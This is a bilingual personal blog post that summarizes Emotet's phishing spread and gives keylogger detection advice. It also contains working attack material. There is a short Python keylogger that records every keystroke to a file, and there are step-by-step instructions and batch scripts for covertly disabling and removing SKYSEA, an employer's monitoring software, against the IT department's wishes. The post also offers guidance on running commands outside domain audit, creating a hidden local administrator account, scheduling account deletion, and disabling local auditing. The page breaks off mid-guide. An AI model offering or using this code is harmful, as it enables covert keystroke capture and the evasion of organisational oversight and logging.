<!DOCTYPE HTML>
<html>

<head>

  <meta charset="utf-8">
  
  <title>Research of Emotet | Andrew&#39;s Blog</title>
  <meta name="author" content="Andrew">
  
  <meta name="description" content="Spread via Word documents通过 Word 文档传播
English中文The EMOTET group managed to take email as an attack vector to a next level. Through a fully automated p">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Research of Emotet"/>
  <meta property="og:site_name" content="Andrew&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/notebook.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/tabs.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>
  <script src="/js/tabs.js"></script>

  <!-- analytics -->
  



<!-- Load mathjax -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/latest.js?config=TeX-AMS_CHTML-full,Safe"></script>
    <!-- MathJax configuration -->
    <script type="text/x-mathjax-config">
    init_mathjax = function() {
        if (window.MathJax) {
        // MathJax loaded
            MathJax.Hub.Config({
                TeX: {
                    equationNumbers: {
                    autoNumber: "AMS",
                    useLabelIds: true
                    }
                },
                tex2jax: {
                    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
                    displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
                    processEscapes: true,
                    processEnvironments: true
                },
                displayAlign: 'center',
                CommonHTML: {
                    linebreaks: {
                    automatic: true
                    }
                }
            });

            MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
        }
    }
    init_mathjax();
    </script>
    <!-- End of mathjax configuration -->

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Andrew&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">		
			<h1> Research of Emotet</h1>
		</div>		
	



<div class="row post">
	<!-- cols -->
	
	<div class="col-md-9">
	

			

	<!-- content -->
	<div class="mypage">
	    <h2 id="Spread-via-Word-documents"><a href="#Spread-via-Word-documents" class="headerlink" title="Spread via Word documents"></a>Spread via Word documents</h2><p><strong>通过 Word 文档传播</strong></p>
<div class="tabs" id="spread-via-word-documents"><ul class="nav-tabs"><li class="tab active"><a href="#spread-via-word-documents-1">English</a></li><li class="tab"><a href="#spread-via-word-documents-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="spread-via-word-documents-1"><p>The EMOTET group managed to take email as an attack vector to a next level. Through a fully automated process, EMOTET malware was delivered to the victims’ computers via infected e-mail attachments.  A variety of different lures were used to trick unsuspecting users into opening these malicious attachments. In the past, EMOTET email campaigns have also been presented as invoices, shipping notices and information about COVID-19.</p>
<p>All these emails contained malicious Word documents, either attached to the email itself or downloadable by clicking on a link within the email itself. Once a user opened one of these documents, they could be prompted to “enable macros” so that the malicious code hidden in the Word file could run and install EMOTET malware on a victim’s computer.</p></div><div class="tab-pane" id="spread-via-word-documents-2"><p>EMOTET 群体成功将电子邮件作为攻击向量提升到了一个新水平。通过完全自动化的过程，EMOTET 恶意软件通过感染的电子邮件附件传递到受害者的计算机上。各种不同的诱饵被用来欺骗毫无戒备的用户打开这些恶意附件。过去，EMOTET 的电子邮件活动也曾被伪装成发票、运输通知和有关 COVID-19 的信息。</p>
<p>所有这些电子邮件都包含恶意的 Word 文档，文档要么附在电子邮件中，要么通过点击邮件中的链接下载。一旦用户打开了这些文档，他们可能会被提示『启用宏』，以便隐藏在 Word 文件中的恶意代码可以运行，并在受害者的计算机上安装 EMOTET 恶意软件。</p></div></div></div>

<h2 id="Attacks-for-hire"><a href="#Attacks-for-hire" class="headerlink" title="Attacks for hire"></a>Attacks for hire</h2><p><strong>雇佣攻击</strong></p>
<div class="tabs" id="attacks-for-hire"><ul class="nav-tabs"><li class="tab active"><a href="#attacks-for-hire-1">English</a></li><li class="tab"><a href="#attacks-for-hire-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="attacks-for-hire-1"><p>EMOTET was much more than just a malware. What made EMOTET so dangerous is that the malware was offered for hire to other cybercriminals to install other types of malware, such as banking Trojans or ransomwares, onto a victim’s computer.</p>
<p>This type of attack is called a ‘loader’ operation, and EMOTET is said to be one of the biggest players in the cybercrime world as other malware operators like TrickBot and Ryuk have benefited from it.</p>
<p>Its unique way of infecting networks by spreading the threat laterally after gaining access to just a few devices in the network made it one of the most resilient malware in the wild.</p></div><div class="tab-pane" id="attacks-for-hire-2"><p>EMOTET 不仅仅是一种恶意软件。EMOTET 之所以危险，是因为它被提供给其他网络犯罪分子，用于在受害者的计算机上安装其他类型的恶意软件，如银行木马或勒索软件。</p>
<p>这种类型的攻击被称为『加载程序』操作，EMOTET 被认为是网络犯罪世界中的最大玩家之一，因为其他恶意软件操作员如 TrickBot 和 Ryuk 从中受益。</p>
<p>它通过在网络中获得访问权限后横向传播威胁的独特方式，使其成为最具弹性的恶意软件之一。</p></div></div></div>

<h2 id="Emotet-Malware"><a href="#Emotet-Malware" class="headerlink" title="Emotet Malware"></a><a target="_blank" rel="noopener" href="https://us-cert.cisa.gov/ncas/alerts/aa20-280a">Emotet Malware</a></h2><p><strong>Emotet 恶意软件</strong></p>
<h2 id="Phishing-Spearphishing-Link"><a href="#Phishing-Spearphishing-Link" class="headerlink" title="Phishing: Spearphishing Link"></a><a target="_blank" rel="noopener" href="https://attack.mitre.org/versions/v7/techniques/T1566/002/">Phishing: Spearphishing Link</a></h2><p><strong>网络钓鱼：带有恶意链接的鱼叉式钓鱼</strong></p>
<div class="tabs" id="phishing:-spearphishing-link"><ul class="nav-tabs"><li class="tab active"><a href="#phishing:-spearphishing-link-1">English</a></li><li class="tab"><a href="#phishing:-spearphishing-link-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="phishing:-spearphishing-link-1"><p>Adversaries may send spearphishing emails with a malicious link in an attempt to elicit sensitive information and&#x2F;or gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.</p>
<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs&#x2F;web beacons). Links may also direct users to malicious applications designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.</p></div><div class="tab-pane" id="phishing:-spearphishing-link-2"><p>对手可能会发送带有恶意链接的鱼叉式钓鱼电子邮件，试图获取敏感信息或访问受害者的系统。带有链接的鱼叉式钓鱼是一种特定变体，与其他形式的鱼叉式钓鱼不同，它使用链接来下载电子邮件中的恶意软件，而不是将恶意文件附加到电子邮件中，以避开可能检查电子邮件附件的防御。</p>
<p>所有形式的鱼叉式钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，恶意电子邮件包含链接。通常，这些链接会伴有社交工程文本，要求用户主动点击或复制并粘贴 URL 到浏览器中，利用用户执行。访问的网站可能会通过利用漏洞来危害浏览器，或者根据电子邮件的背景提示用户下载应用程序、文档、压缩文件甚至可执行文件。对手还可能包括旨在直接与电子邮件阅读器交互的链接，包括旨在直接利用最终系统的嵌入式图像或验证电子邮件接收的 Web 僵尸（即 Web Bugs&#x2F;Web Beacons）。链接还可能将用户引导到旨在窃取应用程序访问令牌（如 OAuth 令牌）的恶意应用程序中，以获得对受保护应用程序和信息的访问权限。</p></div></div></div>

<h2 id="Keylogger"><a href="#Keylogger" class="headerlink" title="Keylogger"></a>Keylogger</h2><p><strong>键盘记录器</strong></p>
<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
</div><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<div class="highlight"><pre><span></span>python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>pynput
</pre></div>

</div>
</div>
</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[1]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>
</pre></div>

    </div>
</div>
</div>

</div>
<div class="cell border-box-sizing code_cell rendered">
<div class="input">
<div class="prompt input_prompt">In&nbsp;[2]:</div>
<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">log_file</span> <span class="o">=</span> <span class="s1">&#39;keylog.txt&#39;</span>

<span class="k">def</span> <span class="nf">on_press</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span> <span class="o">|</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">KeyCode</span> <span class="o">|</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span>

<span class="k">with</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_press</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
    <span class="n">listener</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
 




<hr>
<div class="tabs" id="keylogger-detector"><ul class="nav-tabs"><li class="tab active"><a href="#keylogger-detector-1">Keylogger</a></li><li class="tab"><a href="#keylogger-detector-2">键盘记录器</a></li></ul><div class="tab-content"><div class="tab-pane active" id="keylogger-detector-1"><p>How to detect keyloggers?</p>
<p>Detecting keylogger programs on a computer usually involves fairly obvious warning signs: the browser slows down, there are delays when moving the mouse or typing, or the cursor disappears. Even if you use the best privacy browsers, keyloggers can still track your inputs.</p>
<hr>
<p>How keyloggers infect your device?</p>
<p>Hackers often use social engineering methods to infect victims with keyloggers. A keylogger can infect your device in different ways, sometimes depending on your device type. And even though a spyware removal tool can handle keystroke logger detection, you want to avoid this dangerous type of malware to begin with.</p>
<p>Here’s the general process for how a keylogger infects your device:</p>
<ol>
<li><p>A cybercriminal sends an infected phishing message, usually through an email attachment, SMS message, or infected website.</p>
</li>
<li><p>When you click the link for the infected website or attachment, the keylogger automatically downloads itself onto your device.</p>
</li>
<li><p>The keystroke tracker immediately starts to collect your keystrokes, most likely without being detected until you run a keylogger scan.</p>
</li>
</ol></div><div class="tab-pane" id="keylogger-detector-2"><p>如何检测键盘记录器？</p>
<p>检测计算机上键盘记录器程序的警告信号通常相当明显：浏览器变慢、鼠标移动或键击时出现延迟，或者光标消失。即使你使用最好的隐私浏览器，键盘记录器也能跟踪你的输入。</p>
<hr>
<p>键盘记录器如何感染你的设备？</p>
<p>黑客通常使用社会工程学方法来感染受害者的设备。键盘记录器可以通过多种方式感染你的设备，这些方式有时取决于你的设备类型。虽然间谍软件清除工具可以处理键盘记录器的检测，但最好的办法是从一开始就避免这种危险的恶意软件。</p>
<p>以下是键盘记录器感染你设备的一般过程：</p>
<ol>
<li><p>网络犯罪分子发送带有感染的钓鱼信息，通常通过电子邮件附件、短信或感染的网站进行发送。</p>
</li>
<li><p>当你点击感染网站的链接或附件时，键盘记录器会自动下载到你的设备上。</p>
</li>
<li><p>键盘记录器立即开始收集你的按键输入，通常在你运行键盘记录器扫描之前不会被发现。</p>
</li>
</ol></div></div></div>

<h2 id="SKYSEA-这个间谍软件的删除方法"><a href="#SKYSEA-这个间谍软件的删除方法" class="headerlink" title="SKYSEA 这个间谍软件的删除方法"></a>SKYSEA 这个间谍软件的删除方法</h2><ul>
<li>Microsoft Policy Platform</li>
<li>Microsoft Endpoint Manager<ul>
<li>Microsoft Endpoint Configuration Manager<ul>
<li>Configuration Manager Remote Control Service</li>
</ul>
</li>
<li>Microsoft Intune<ul>
<li>Microsoft Intune Management Extension</li>
</ul>
</li>
</ul>
</li>
<li>Microsoft Azure Information Protection</li>
<li>Azure Monitor Agent</li>
</ul>
<h3 id="一、详细操作指南"><a href="#一、详细操作指南" class="headerlink" title="一、详细操作指南"></a><a target="_blank" rel="noopener" href="https://note.com/ironhead/n/na2410e5d8d1a">一、详细操作指南</a></h3><p>社内PC上未经允许安装并获取操作日志的麻烦间谍软件。让我们根除这个间谍软件，提高生活质量（QoL）。</p>
<ol>
<li><p>使用 <a target="_blank" rel="noopener" href="https://registry-finder.com/bin/2.51.0.0/RegistryFinder64.zip">RegistryFinder</a> 删除注册表中所有包含 “skysea” 的项。也可以使用 regedit，但比较麻烦。</p>
<p>删除注册表中 Key 列和 Value 列中包含 “SKYSEA” 的记录（右键点击 → 从注册表中删除）。</p>
</li>
<li><p>通过资源管理器右键点击 PC → 管理 → 左侧树状图中的 服务和应用程序 → 服务中的 “Swd” 右键点击 → 属性 → 将服务状态设置为停止，将启动类型设置为禁用。</p>
<p>删除 C:\WINDOWS 目录中的 “wds” 文件夹。</p>
</li>
<li><p>通过资源管理器右键点击 PC → 管理 → 左侧树状图中的 服务和应用程序 → 服务中的 “awssm” 右键点击 → 属性 → 将服务状态设置为停止，将启动类型设置为禁用。</p>
<p>删除 C:\WINDOWS 目录中的 “awssm” 文件夹。</p>
</li>
<li><p>将以下文本保存为 .bat 文件并运行。也可以手动停止和禁用服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 禁用服务</span><br><span class="line">sc config &quot;Swd&quot; start= disabled</span><br><span class="line">sc config &quot;awssm&quot; start= disabled</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= disabled</span><br><span class="line">sc config &quot;CompactSvc&quot; start= disabled</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= disabled</span><br><span class="line">sc config &quot;AstExAgt&quot; start= disabled</span><br><span class="line">sc config &quot;ScvSvc&quot; start= disabled</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= disabled</span><br><span class="line">sc config &quot;LogSvr&quot; start= disabled</span><br><span class="line">sc config &quot;IceSvc&quot; start= disabled</span><br><span class="line"></span><br><span class="line">rem 停止服务</span><br><span class="line">net stop &quot;Swd&quot;</span><br><span class="line">net stop &quot;awssm&quot;</span><br><span class="line">net stop &quot;SCVCabProxySvr&quot;</span><br><span class="line">net stop &quot;CompactSvc&quot;</span><br><span class="line">net stop &quot;ScvUpdSvc&quot;</span><br><span class="line">net stop &quot;AstExAgt&quot;</span><br><span class="line">net stop &quot;ScvSvc&quot;</span><br><span class="line">net stop &quot;SCV LogAgentService&quot;</span><br><span class="line">net stop &quot;LogSvr&quot;</span><br><span class="line">net stop &quot;IceSvc&quot;</span><br></pre></td></tr></table></figure>

<p>因为各服务会进行活性监控，需要多次运行 bat 文件来完全停止它们。如果不行的话可以手动从服务界面停止。</p>
</li>
<li><p>打开任务管理器，右键点击 “SKYSEA Client View Version 16.1” → 结束任务。然后删除 C:\Program Files (x86) 目录中的 “Sky Product” 文件夹。如果无法删除，可能是服务未完全停止或者任务管理器中还有 “SKYSEA Client View Version 16.1”。</p>
</li>
<li><p>重启电脑，如果任务管理器中没有任何与 “SKYSEA” 相关的进程，说明删除成功。</p>
</li>
</ol>
<p>结束监视社会。感谢这家公司，我连藤原竜也都讨厌了。</p>
<h4 id="2023年10月15日更新"><a href="#2023年10月15日更新" class="headerlink" title="2023年10月15日更新"></a>2023年10月15日更新</h4><p>在多次停止服务后，系统部门又说『日志无法获取了』，我反复说『请远程安装』，然后删除了日志。但随着新版本的发布，他们要求重新安装。我本来不想安装，但最后不得不安装。安装后，他们又说『日志无法获取』，但我不在乎。</p>
<p>后来我再次尝试删除这个恶心的间谍软件，但 “C:\Program Files (x86)\Sky Product\SKYSEA Client View” 文件夹被占用，无法删除。因为不想查找具体是哪项服务占用，于是按照以下步骤进行处理：</p>
<ol>
<li>右键点击 Windows 标志，选择 “运行”。</li>
<li>输入 “resmon.exe” 并点击 “确定”。</li>
<li>在资源监视器中，打开 “CPU” 选项卡。</li>
<li>展开 “关联的句柄” 部分。</li>
<li>在 “关联的句柄” 搜索框中输入 “SKYSEA Client View”。</li>
<li>等待搜索结果显示。</li>
<li>右键点击显示的进程，选择 “结束进程”。</li>
</ol>
<p>即便是 Chrome 和 Outlook 也受到影响，这太恶心了。想到系统部门的老男人可能会窥探女性员工的搜索历史，真是太可怕了。</p>
<p>无法删除文件夹时，可以通过移除 administrators 权限并授予 everyone 完全控制权限来删除文件夹。</p>
<h3 id="二、服务停止与启动脚本"><a href="#二、服务停止与启动脚本" class="headerlink" title="二、服务停止与启动脚本"></a><a target="_blank" rel="noopener" href="https://note.com/ironhead/n/n2720b588193a">二、服务停止与启动脚本</a></h3><p>昨天写的删除方法，其实不用删除注册表也可以停止服务。但是，如果想彻底清理，建议删除注册表项目。</p>
<p>因为有些公司可能会在删除后抱怨，所以我创建了停止和启动服务的 bat 文件。请在自担风险下使用。</p>
<h4 id="服务停止-bat"><a href="#服务停止-bat" class="headerlink" title="服务停止.bat"></a>服务停止.bat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 禁用服务并停止，移动模块</span><br><span class="line">sc config &quot;Swd&quot; start= disabled</span><br><span class="line">net stop &quot;Swd&quot;</span><br><span class="line">move C:\Windows\wds C:\kasu\wds</span><br><span class="line"></span><br><span class="line">sc config &quot;awssm&quot; start= disabled</span><br><span class="line">net stop &quot;awssm&quot;</span><br><span class="line">move C:\WINDOWS\avv5sm C:\kasu\avv5sm</span><br><span class="line"></span><br><span class="line">rem 终止进程</span><br><span class="line">taskkill /F /im CtlCli64.exe</span><br><span class="line">taskkill /F /im LogChromeNativeHost.exe</span><br><span class="line">taskkill /F /im AstAgent.exe</span><br><span class="line">taskkill /F /im CtlCli.exe</span><br><span class="line">taskkill /F /im SvcMon.exe</span><br><span class="line">taskkill /F /im SKYSEAHS.exe</span><br><span class="line"></span><br><span class="line">rem 禁用其他服务</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= disabled</span><br><span class="line">sc config &quot;CompactSvc&quot; start= disabled</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= disabled</span><br><span class="line">sc config &quot;AstExAgt&quot; start= disabled</span><br><span class="line">sc config &quot;ScvSvc&quot; start= disabled</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= disabled</span><br><span class="line">sc config &quot;LogSvr&quot; start= disabled</span><br><span class="line">sc config &quot;IceSvc&quot; start= disabled</span><br><span class="line"></span><br><span class="line">rem 停止其他服务</span><br><span class="line">net stop &quot;SCVCabProxySvr&quot;</span><br><span class="line">net stop &quot;CompactSvc&quot;</span><br><span class="line">net stop &quot;ScvUpdSvc&quot;</span><br><span class="line">net stop &quot;AstExAgt&quot;</span><br><span class="line">net stop &quot;ScvSvc&quot;</span><br><span class="line">net stop &quot;SCV LogAgentService&quot;</span><br><span class="line">net stop &quot;LogSvr&quot;</span><br><span class="line">net stop &quot;IceSvc&quot;</span><br><span class="line"></span><br><span class="line">rem 移动 C:\Program Files (x86)\Sky Product 文件夹</span><br><span class="line">move &quot;C:\Program Files (x86)\Sky Product&quot; &quot;C:\kasu&quot;</span><br></pre></td></tr></table></figure>

<h4 id="服务启动-bat"><a href="#服务启动-bat" class="headerlink" title="服务启动.bat"></a>服务启动.bat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 启用服务并启动，移动模块</span><br><span class="line">sc config &quot;Swd&quot; start= auto</span><br><span class="line">net start &quot;Swd&quot;</span><br><span class="line">move C:\kasu\wds C:\Windows\wds</span><br><span class="line"></span><br><span class="line">sc config &quot;awssm&quot; start= auto</span><br><span class="line">net start &quot;awssm&quot;</span><br><span class="line">move C:\kasu\avv5sm C:\WINDOWS\avv5sm</span><br><span class="line"></span><br><span class="line">rem 启用其他服务</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= auto</span><br><span class="line">sc config &quot;CompactSvc&quot; start= auto</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= auto</span><br><span class="line">sc config &quot;AstExAgt&quot; start= auto</span><br><span class="line">sc config &quot;ScvSvc&quot; start= auto</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= auto</span><br><span class="line">sc config &quot;LogSvr&quot; start= auto</span><br><span class="line">sc config &quot;IceSvc&quot; start= auto</span><br><span class="line"></span><br><span class="line">rem 启动其他服务</span><br><span class="line">net start &quot;SCVCabProxySvr&quot;</span><br><span class="line">net start &quot;CompactSvc&quot;</span><br><span class="line">net start &quot;ScvUpdSvc&quot;</span><br><span class="line">net start &quot;AstExAgt&quot;</span><br><span class="line">net start &quot;ScvSvc&quot;</span><br><span class="line">net start &quot;SCV LogAgentService&quot;</span><br><span class="line">net start &quot;LogSvr&quot;</span><br><span class="line">net start &quot;IceSvc&quot;</span><br><span class="line"></span><br><span class="line">rem 移动 C:\Program Files (x86)\Sky Product 文件夹回原位置</span><br><span class="line">move &quot;C:\kasu\Sky Product&quot; &quot;C:\Program Files (x86)&quot;</span><br></pre></td></tr></table></figure>

<h2 id="组织域管理员"><a href="#组织域管理员" class="headerlink" title="组织域管理员"></a>组织域管理员</h2><p>域管理员在未联网的计算机终端上用 CMD 执行的命令不会被域级审计，因为域级审计依赖于计算机与域控制器之间的通信。若计算机与域控制器断开连接（未联网），域级审计无法实时获取和记录该计算机的操作信息。</p>
<p>详细解释</p>
<ol>
<li>域级审计的工作原理：<ul>
<li>域级审计通过域控制器推送审计策略，监控和收集域中计算机的操作信息。</li>
<li>当计算机执行某些命令或操作时，会向域控制器发送事件日志，存储在域控制器的安全日志中。</li>
</ul>
</li>
<li>未联网时的影响：<ul>
<li>如果计算机未连接到网络或无法访问域控制器，任何在该计算机上执行的命令都无法实时同步到域控制器。</li>
<li>因此，域级审计无法记录这些操作。</li>
</ul>
</li>
<li>本地审计的作用：<ul>
<li>虽然无法进行域级审计，但本地审计策略（如进程创建审计、登录审计）仍然有效。</li>
<li>这些操作会记录到本地安全日志中（在事件查看器的安全日志下）。</li>
<li>例如，Windows 事件 ID 4688 会记录新进程的创建。</li>
</ul>
</li>
<li>联网后同步：<ul>
<li>当未联网的计算机重新连接到域后，域策略可以再次应用，但在断网期间生成的本地日志不会自动上传到域控制器。</li>
<li>需要手动导出或通过集中式日志管理工具收集这些本地日志。</li>
</ul>
</li>
</ol>
<h3 id="创建本地管理员账户"><a href="#创建本地管理员账户" class="headerlink" title="创建本地管理员账户"></a>创建本地管理员账户</h3><p>组织域管理员登录到某个计算机终端并使用 <code>cmd</code> 或 <code>PowerShell</code> 创建一个新的本地管理员账户：</p>
<ul>
<li><p>通过 <code>cmd</code> 创建本地管理员：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user NewLocalAdmin password /add</span><br><span class="line"><span class="built_in">net</span> localgroup Administrators NewLocalAdmin /add</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过 <code>PowerShell</code> 创建本地管理员：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-LocalUser</span> <span class="string">&quot;NewLocalAdmin&quot;</span> <span class="literal">-Password</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;password&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Administrators&quot;</span> <span class="literal">-Member</span> <span class="string">&quot;NewLocalAdmin&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>这会在本地计算机上创建一个名为 <code>NewLocalAdmin</code> 的用户，并将其添加到 <code>Administrators</code> 组中，从而赋予该账户管理员权限。</p>
<h3 id="删除本地管理员账户"><a href="#删除本地管理员账户" class="headerlink" title="删除本地管理员账户"></a>删除本地管理员账户</h3><p>假设你希望任务在 2024 年 12 月 25 日午夜 12 点删除本地管理员账户，可以按照如下方式创建任务：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;DeleteCurrentAdmin&quot; /tr &quot;<span class="built_in">net</span> user CurrentAdmin /delete&quot; /sc once /st <span class="number">00</span>:<span class="number">00</span> /sd <span class="number">12</span>/<span class="number">25</span>/<span class="number">2024</span></span><br></pre></td></tr></table></figure>

<p>解释：</p>
<ul>
<li><code>/sc once</code>：表示这是一个只执行一次的任务。</li>
<li><code>/st 00:00</code>：设定任务的开始时间为午夜12点（00:00）。</li>
<li><code>/sd 12/25/2024</code>：指定任务的具体日期为 2024 年 12 月 25 日。</li>
</ul>
<p>这样，任务将在指定的日期和时间执行并删除本地管理员账户。</p>
<h3 id="禁用本地审计"><a href="#禁用本地审计" class="headerlink" title="禁用本地审计"></a>禁用本地审计</h3><p>要在 Windows 系统上禁用本地审计，可以通过本地组策略编辑器或命令行工具来进行。以下是两种常见方法：</p>
<h4 id="方法-1：使用本地组策略编辑器禁用本地审计"><a href="#方法-1：使用本地组策略编辑器禁用本地审计" class="headerlink" title="方法 1：使用本地组策略编辑器禁用本地审计"></a>方法 1：使用本地组策略编辑器禁用本地审计</h4><ol>
<li>打开本地组策略编辑器：<ul>
